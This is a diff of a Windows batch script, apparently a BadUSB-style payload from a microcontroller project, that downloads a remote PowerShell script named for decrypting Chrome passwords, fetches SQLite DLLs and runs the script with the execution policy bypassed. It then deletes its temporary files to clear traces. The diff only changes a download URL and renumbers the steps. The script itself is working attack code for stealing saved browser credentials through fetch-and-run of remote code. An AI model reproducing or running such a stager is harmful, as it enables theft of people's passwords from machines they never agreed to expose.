@@ -6,18 +6,20 @@ if not exist %tempDir% mkdir %tempDir%
 :: Step 2: Download SQLite DLLs and PowerShell script
 echo Downloading necessary files...
 powershell -Command "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/mrx-arafat/AtTiny85-Gameplay/main/Decrypt%20Chrome%20Passwords/decrypt_chrome_passwords.ps1' -OutFile '%tempDir%\decrypt_chrome_passwords.ps1'"
-powershell -Command "Invoke-WebRequest -Uri 'https://github.com/sqlite/sqlite/releases/download/version-3.39.2/sqlite-dll-win64-x64-3390200.zip' -OutFile '%tempDir%\sqlite.zip'"
+powershell -Command "Invoke-WebRequest -Uri 'https://www.sqlite.org/2022/sqlite-dll-win64-x64-3390200.zip' -OutFile '%tempDir%\sqlite.zip'"
 
 :: Step 3: Extract SQLite DLLs
 powershell -Command "Expand-Archive -Path '%tempDir%\sqlite.zip' -DestinationPath '%tempDir%\sqlite' -Force"
 
-:: Step 4: Execute the PowerShell script with local SQLite DLLs
+:: Step 4: Update PATH to include SQLite DLLs
 set PATH=%tempDir%\sqlite;%PATH%
+
+:: Step 5: Execute the PowerShell script
 powershell -ExecutionPolicy Bypass -File "%tempDir%\decrypt_chrome_passwords.ps1"
 
-:: Step 5: Cleanup
+:: Step 6: Cleanup temporary files
 cd /d %temp%
 rd /s /q %tempDir%
 
-:: Step 6: Exit
+:: Step 7: Exit
 exit
